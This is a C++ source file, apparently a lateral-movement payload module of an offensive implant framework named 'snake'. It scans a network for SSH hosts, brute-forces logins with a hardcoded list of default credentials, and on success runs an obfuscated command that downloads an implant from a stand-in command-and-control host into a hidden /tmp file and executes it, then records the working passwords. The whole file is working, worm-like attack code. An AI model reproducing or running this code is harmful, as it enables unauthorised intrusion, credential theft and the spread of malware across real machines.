#ifndef _WIN32

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <cerrno>
#include <condition_variable>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "snake/payloads.hpp"
#include "snake/stealth.hpp"
#include "ssh_client.hpp"

namespace snake::payloads {
namespace {

int parse_leading_int(const std::string& s, int fallback) {
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t')) ++i;
    bool neg = false;
    if (i < s.size() && (s[i] == '+' || s[i] == '-')) {
        neg = (s[i] == '-');
        ++i;
    }
    size_t start = i;
    long long v = 0;
    while (i < s.size() && s[i] >= '0' && s[i] <= '9') {
        v = v * 10 + (s[i] - '0');
        if (v > 2147483647LL) v = 2147483647LL;
        ++i;
    }
    if (i == start) return fallback;
    return (int)(neg ? -v : v);
}

bool parse_cidr_v4(const std::string& network, uint32_t& net_addr, uint32_t& mask) {
    size_t slash = network.find('/');
    if (slash == std::string::npos) return false;
    std::string ip_part = network.substr(0, slash);
    std::string bits_part = network.substr(slash + 1);
    if (bits_part.empty()) return false;
    for (char c : bits_part)
        if (c < '0' || c > '9') return false;
    long bits = std::strtol(bits_part.c_str(), nullptr, 10);
    if (bits < 0 || bits > 32) return false;
    if (ip_part.find(':') != std::string::npos) return false;
    struct in_addr addr;
    if (inet_pton(AF_INET, ip_part.c_str(), &addr) != 1) return false;
    mask = (bits == 0) ? 0u : (bits >= 32 ? 0xffffffffu : (uint32_t)(0xffffffffu << (32 - bits)));
    net_addr = ntohl(addr.s_addr) & mask;
    return true;
}

std::string ip_string(uint32_t ip) {
    struct in_addr a;
    a.s_addr = htonl(ip);
    char buf[INET_ADDRSTRLEN];
    if (inet_ntop(AF_INET, &a, buf, sizeof(buf)) == nullptr) return "";
    return buf;
}

bool ip_in_net(uint32_t ip, uint32_t net_addr, uint32_t mask) {
    return (ip & mask) == net_addr;
}

bool tcp_dial_ok(const std::string& host, uint16_t port, int timeout_ms) {
    if (safe_mode()) return false;
    char portbuf[8];
    std::snprintf(portbuf, sizeof(portbuf), "%u", (unsigned)port);
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(host.c_str(), portbuf, &hints, &res) != 0 || res == nullptr) return false;

    bool ok = false;
    for (struct addrinfo* ai = res; ai != nullptr && !ok; ai = ai->ai_next) {
        int fd = ::socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;
        int fl = fcntl(fd, F_GETFL, 0);
        if (fl >= 0) fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        int rc = ::connect(fd, ai->ai_addr, ai->ai_addrlen);
        if (rc == 0) {
            ok = true;
        } else if (errno == EINPROGRESS) {
            struct pollfd pfd;
            pfd.fd = fd;
            pfd.events = POLLOUT;
            if (::poll(&pfd, 1, timeout_ms) > 0) {
                int err = 0;
                socklen_t len = sizeof(err);
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) == 0 && err == 0) ok = true;
            }
        }
        ::close(fd);
    }
    freeaddrinfo(res);
    return ok;
}

std::vector<std::string> discover_hosts(const std::string& network) {
    std::vector<std::string> hosts;

    if (!safe_mode()) {
        std::string fping = which_exe("fping");
        if (!fping.empty()) {
            CmdResult out = run_cmd_out({fping, "-a", "-g", network, "-q"});
            if (out.ok) {
                for (const std::string& line : split(out.out, '\n')) {
                    std::string ip = trim(line);
                    if (!ip.empty()) hosts.push_back(ip);
                }
                if (!hosts.empty()) return hosts;
            }
        }
    }

    uint32_t net_addr = 0, mask = 0;
    if (!parse_cidr_v4(network, net_addr, mask)) return hosts;

    for (uint64_t cur = net_addr; cur <= 0xffffffffULL; ++cur) {
        uint32_t ip = (uint32_t)cur;
        if (!ip_in_net(ip, net_addr, mask)) break;
        if (((ip >> 24) == 127) || ip == net_addr) continue;
        if (tcp_dial_ok(ip_string(ip), 22, 500)) hosts.push_back(ip_string(ip));
        if (hosts.size() >= 50) break;
    }
    return hosts;
}

struct CredPair {
    const char* user;
    std::vector<const char*> passwords;
};
const std::vector<CredPair>& common_creds() {
    static const std::vector<CredPair> creds = {
        {"root", {"root", "toor", "admin", "password", ""}},
        {"admin", {"admin", "password", "123456", ""}},
        {"ubuntu", {"ubuntu", ""}},
        {"pi", {"raspberry", ""}},
        {"user", {"user", "123456", ""}},
    };
    return creds;
}

bool try_ssh_deploy(const std::string& host, const std::string& username,
                    const std::string& password, const std::string& implant_url) {
    if (safe_mode()) return false;
    sshdet::SshClient client;
    if (!client.auth_password(host, 22, username, password, 5)) return false;
    std::string cmd =
        SNAKE_OBF("curl -s ") + implant_url +
        SNAKE_OBF(" -o /tmp/.update.py && python3 /tmp/.update.py &");
    client.exec_session(cmd);
    return true;
}

struct DeployHost {
    std::string ip;
    bool online = false;
    bool deployed = false;
};

struct DeployCred {
    std::string host;
    std::string username;
    std::string password;
};

struct AutoDeployResult {
    std::string timestamp;
    std::string network;
    int discovered = 0;
    int deployed = 0;
    int failed = 0;
    std::vector<DeployHost> hosts;
    std::vector<DeployCred> credentials;
};

std::string marshal_result(const AutoDeployResult& r) {
    nlohmann::json v;
    v["timestamp"] = r.timestamp;
    v["network"] = r.network;
    v["discovered"] = r.discovered;
    v["deployed"] = r.deployed;
    v["failed"] = r.failed;
    if (r.hosts.empty()) {
        v["hosts"] = nullptr;
    } else {
        nlohmann::json arr = nlohmann::json::array();
        for (const DeployHost& h : r.hosts) {
            nlohmann::json o;
            o["ip"] = h.ip;
            o["online"] = h.online;
            o["deployed"] = h.deployed;
            arr.push_back(o);
        }
        v["hosts"] = arr;
    }
    if (!r.credentials.empty()) {
        nlohmann::json arr = nlohmann::json::array();
        for (const DeployCred& c : r.credentials) {
            nlohmann::json o;
            o["host"] = c.host;
            o["username"] = c.username;
            o["password"] = c.password;
            arr.push_back(o);
        }
        v["valid_credentials"] = arr;
    }
    return MarshalJSON(v);
}

AutoDeployResult deploy(const std::string& network, const std::string& implant_url, int threads) {
    AutoDeployResult r;
    r.timestamp = now_rfc3339();
    r.network = network;

    std::vector<std::string> hosts = discover_hosts(network);
    r.discovered = (int)hosts.size();
    for (const std::string& h : hosts) {
        DeployHost dh;
        dh.ip = h;
        dh.online = true;
        r.hosts.push_back(dh);
    }
    if (hosts.empty()) return r;

    if (threads < 1) threads = 1;
    std::mutex mu;
    std::mutex sema_mu;
    std::condition_variable sema_cv;
    int in_flight = 0;
    auto try_acquire = [&]() {
        std::unique_lock<std::mutex> lk(sema_mu);
        sema_cv.wait(lk, [&] { return in_flight < threads; });
        ++in_flight;
    };
    auto release = [&]() {
        std::lock_guard<std::mutex> lk(sema_mu);
        --in_flight;
        sema_cv.notify_one();
    };

    std::vector<std::thread> workers;
    workers.reserve(hosts.size());
    for (const std::string& host : hosts) {
        try_acquire();
        workers.emplace_back([&, host]() {
            bool deployed_here = false;
            for (const CredPair& cred : common_creds()) {
                if (deployed_here) break;
                for (const char* pass : cred.passwords) {
                    if (try_ssh_deploy(host, cred.user, pass, implant_url)) {
                        std::lock_guard<std::mutex> lk(mu);
                        r.deployed++;
                        DeployCred c;
                        c.host = host;
                        c.username = cred.user;
                        c.password = pass;
                        r.credentials.push_back(c);
                        deployed_here = true;
                        break;
                    }
                    ::usleep(100 * 1000);
                }
            }
            if (!deployed_here) {
                std::lock_guard<std::mutex> lk(mu);
                r.failed++;
            }
            release();
        });
    }
    for (std::thread& t : workers) t.join();
    return r;
}

class AutoDeploy : public Payload {
  public:
    const char* name() const override { return "autodeploy"; }
    const char* category() const override { return "lateral"; }
    const char* description() const override {
        return "Auto-discover hosts via network scanning and deploy implants via SSH";
    }

    Output execute(const Args& args) const override {
        auto arg = [&](const char* k) -> std::string {
            auto it = args.find(k);
            return (it == args.end()) ? std::string() : it->second;
        };

        std::string network = arg("network");
        if (network.empty()) network = "192.168.1.0/24";
        std::string implant_url = arg("implant_url");
        if (implant_url.empty()) implant_url = "http://rogue-c2.example.com/implant";
        int threads = parse_leading_int(arg("threads"), 10);

        AutoDeployResult r = deploy(network, implant_url, threads);
        std::string s = marshal_result(r);
        return Output(s.begin(), s.end());
    }
};

AutoDeploy g_autodeploy;
struct Reg {
    Reg() { Register(&g_autodeploy); }
} g_reg;

}  // namespace
}  // namespace snake::payloads

#endif  // _WIN32
